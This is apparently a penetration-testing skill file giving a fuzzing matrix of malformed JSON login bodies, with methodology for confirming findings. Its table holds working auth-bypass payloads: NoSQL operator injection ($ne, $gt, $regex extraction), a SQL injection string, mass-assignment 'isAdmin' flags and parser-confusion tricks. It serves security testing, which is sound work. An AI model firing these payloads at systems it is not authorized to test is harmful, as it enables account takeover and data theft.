---
name: json-request-fuzzing
description: Malformed / edge-case JSON body fuzzing matrix for auth-bypass, type-juggling, NoSQL operator, and parser-confusion bugs on JSON-accepting endpoints
---

# JSON Request Fuzzing

A test matrix of malformed and edge-case JSON bodies to throw at any `application/json` endpoint — especially login/auth — to surface type-juggling, NoSQL operator injection, JSON parser confusion, and authentication-bypass bugs. This complements the deeper single-class skills: for the equality/coercion mechanics see `type_juggling.md`, for operator injection see `nosql_injection.md`, and for encoding/null-byte tricks see `input_validation.md`. This file is the consolidated fuzzing checklist to run first.

Replace `login`/`password` with the target's actual field names, and observe status code, response length, and any auth/session grant on each case.

## Why It Works

A JSON endpoint hands untyped attacker data to a parser and then a backend. Bugs appear when:
- The backend compares with loose equality (`==`) or coerces types (`true`/`1`/`0`/`null` for a string field).
- The value is spread into a query object, so `{"$ne": null}` / `{"$regex": "^a"}` reaches a NoSQL driver.
- The parser and the backend disagree — duplicate keys, comments, trailing bytes, single quotes — so validation sees one value and the sink sees another.
- A downgraded content-type (`application/x-www-form-urlencoded` / `text/plain`) skips JSON-only validation.

## Fuzzing Matrix

| Test Case | JSON Body | Hunts for |
| --- | --- | --- |
| Baseline | `{"login": "admin", "password": "admin"}` | control |
| Empty | `{"login": "", "password": ""}` | empty-string auth |
| Null | `{"login": null, "password": null}` | null coercion |
| Numbers | `{"login": 123, "password": 456}` | type confusion |
| Booleans | `{"login": true, "password": false}` | boolean coercion / admin flip |
| Arrays | `{"login": ["admin"], "password": ["password"]}` | array coercion / strcmp NULL |
| Objects | `{"login": {"username": "admin"}, "password": {"password": "password"}}` | nested-object handling |
| SQLi | `{"login": "admin' --", "password": "x"}` | SQL injection |
| NoSQL `$ne` | `{"login": {"$ne": null}, "password": {"$ne": null}}` | MongoDB operator injection |
| NoSQL `$gt` | `{"login": {"$gt": ""}, "password": {"$gt": ""}}` | operator auth bypass |
| NoSQL `$regex` | `{"login": "admin", "password": {"$regex": "^a"}}` | blind extraction |
| NoSQL `$oid` | `{"login": {"$oid": "507c7f79bcf86cd7994f6c0e"}, "password": "x"}` | BSON type injection |
| Missing key | `{"password": "admin"}` / `{"login": "admin"}` | required-field bypass |
| Swapped keys | `{"admin": "login", "password": "x"}` | field-name confusion |
| Extra keys | `{"login": "admin", "password": "admin", "isAdmin": true}` | mass-assignment (see mass_assignment.md) |
| Duplicate keys | `{"login": "admin", "login": "user", "password": "x"}` | parser precedence mismatch |
| Case variants | `{"LOGIN": "admin", "PASSWORD": "x"}` | case-insensitive binding |
| Single quotes | `{'login': 'admin', 'password': 'x'}` | lax parser acceptance |
| Undefined | `{"login": undefined, "password": undefined}` | non-standard token handling |
| Unicode escapes | `{"login": "\u0061\u0064\u006D\u0069\u006E", ...}` | filter bypass via `\u` |
| Octal escapes | `{"login": "\141\144\155\151\156", ...}` | octal decode bypass |
| Hex values | `{"login": "0x1234", "password": "0x5678"}` | hex coercion |
| Base64 | `{"login": "YWRtaW4=", "password": "cGFzc3dvcmQ="}` | decode-then-compare paths |
| Exponential | `{"login": "1e5", "password": "1e10"}` | numeric coercion |
| Large numbers | `{"login": 12345678901234567890, ...}` | integer overflow / precision |
| Leading zeros | `{"login": "000123", ...}` | numeric normalization |
| Control chars | `{"login": "ad\u0000min", "password": "pass\u0000word"}` | null-byte truncation |
| Newline/Tab | `{"login": "ad\nmin", "password": "pa\tssword"}` | log/parser injection |
| JSON-in-string | `{"login": "{\"injection\":\"value\"}", ...}` | second-stage JSON parse |
| Overlong values | `{"login": "<10000 chars>", ...}` | DoS / truncation |
| Overlong keys | `{"<10000-char key>": "admin", ...}` | key-length handling |
| Trailing garbage | `{"login": "admin", "password": "x"}@@@@` | lenient-parser confusion |
| Comments | `{/*"login":"admin","password":"x"*/}` | comment-tolerant parser |
| Mixed types | `{"login": ["admin", 123, true, null, {"username": ["admin"]}]}` | polymorphic handling |
| CT downgrade | `login=admin&password=x` as `text/plain` or `x-www-form-urlencoded` | JSON-only validation bypass |

## Methodology

1. Capture a working JSON login/API request; establish the baseline response (status, length, session behavior).
2. Walk the matrix one case at a time; flag any that grant a session, change data, or produce a differential response.
3. On a promising operator case, pivot to `nosql_injection.md` to confirm a boolean/regex oracle (a 500 alone is not injection).
4. On boolean/number/array cases that flip auth or roles, pivot to `type_juggling.md` for the exact comparison bug.
5. Always re-run the winning case with a content-type downgrade — validation pipelines frequently guard only `application/json`.

## Validation

- A malformed body that yields a valid session / logged-in state = confirmed auth bypass (High/Critical).
- A `$regex` differential that extracts a real secret character-by-character = confirmed NoSQL injection (Critical).
- A duplicate-key / trailing-garbage case that reaches a different sink than validation saw = confirmed parser confusion.
- A 500/parse error with no exploit is at most Informational — do not report it as injection.

## False Positives

- Uniform 500s across all operator/type cases = type validation rejecting non-string input, not injection.
- Response differences caused by input-validation errors rather than backend execution.
- Strongly-typed backends (Go/Java/Rust with typed DTOs) that reject or cast before comparison.
- Content-type downgrade that the gateway rejects outright.
